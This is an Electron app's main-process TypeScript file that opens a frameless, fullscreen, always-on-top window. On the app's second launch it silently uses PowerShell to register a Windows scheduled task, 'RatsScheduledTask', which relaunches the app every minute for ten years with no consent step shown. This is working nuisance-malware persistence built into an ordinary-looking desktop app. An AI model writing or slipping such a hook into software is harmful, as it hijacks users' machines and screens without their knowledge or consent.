import { app, BrowserWindow, ipcMain } from 'electron';
import path from 'node:path';
import fs from 'node:fs';
import squirrelStartup from 'electron-squirrel-startup';
import { exec } from 'child_process';

// Handle creating/removing shortcuts on Windows when installing/uninstalling.
if (squirrelStartup) {
  app.quit();
}

let mainWindow: BrowserWindow | null = null;
let popupWindow: BrowserWindow | null = null;

// Path to the user data file
const dataPath = path.join(app.getPath('userData'), 'data.json');

function readLaunchData(): { launchCount: number } {
  try {
    const data = fs.readFileSync(dataPath, 'utf-8');
    return JSON.parse(data);
  } catch {
    return { launchCount: 0 };
  }
}

function saveLaunchData(data: { launchCount: number }) {
  fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));
}

const createMainWindow = () => {
  mainWindow = new BrowserWindow({
    width: 800,
    height: 600,
    frame: false,
    icon: path.join(__dirname, '../assets/icons/app.ico'),
    resizable: true,
    alwaysOnTop: true,
    fullscreen: true,
    titleBarStyle: 'hidden',
    titleBarOverlay: false,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      sandbox: false,
      additionalArguments: process.argv.slice(1)
    },
  });

  if (MAIN_WINDOW_VITE_DEV_SERVER_URL) {
    mainWindow.loadURL(MAIN_WINDOW_VITE_DEV_SERVER_URL);
  } else {
    mainWindow.loadFile(
      path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}/index.html`)
    );
  }
};

const createFirstTimeWindow = () => {
  popupWindow = new BrowserWindow({
    width: 690,
    height: 420,
    frame: false,
    resizable: false,
    minimizable: false,
    maximizable: false,
    alwaysOnTop: true,
    modal: true,
    parent: mainWindow ?? undefined,
    transparent: true,
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      sandbox: false,
    },
  });

  if (MAIN_WINDOW_VITE_DEV_SERVER_URL) {
    popupWindow.loadURL(`${MAIN_WINDOW_VITE_DEV_SERVER_URL}/firstTime.html`);
  } else {
    popupWindow.loadFile(
      path.join(__dirname, `../renderer/${MAIN_WINDOW_VITE_NAME}/firstTime.html`)
    );
  }
};

app.on('ready', () => {
  const data = readLaunchData();
  
  createMainWindow();

  if (data.launchCount === 1) {
    exec(`
      $action = New-ScheduledTaskAction -Execute "${process.execPath}" -Argument "--timer"
      # $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration (New-TimeSpan -Days 3650) -RandomDelay 00:05:00
      $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date.AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
      $settings = New-ScheduledTaskSettingsSet
      $task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
      Register-ScheduledTask RatsScheduledTask -InputObject $task
      Write-Output "Scheduled task 'RatsScheduledTask' created successfully using path: ${process.execPath}."
      `, { 'shell': 'powershell.exe' }, (error, stdout, stderr) => {
      console.log(stdout);
      console.log(stderr);
      if (error) {
        console.log(`error: ${error.message}`);
      }
    });
    createFirstTimeWindow();
  }

  data.launchCount += 1;
  saveLaunchData(data);
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) createMainWindow();
});

ipcMain.on('window-control', (event, action) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  if (!win) return;

  switch (action) {
    case 'minimize':
      win.minimize();
      break;
    case 'maximize':
      win.isMaximized() ? win.unmaximize() : win.maximize();
      break;
    case 'close':
      win.close();
      break;
  }
});
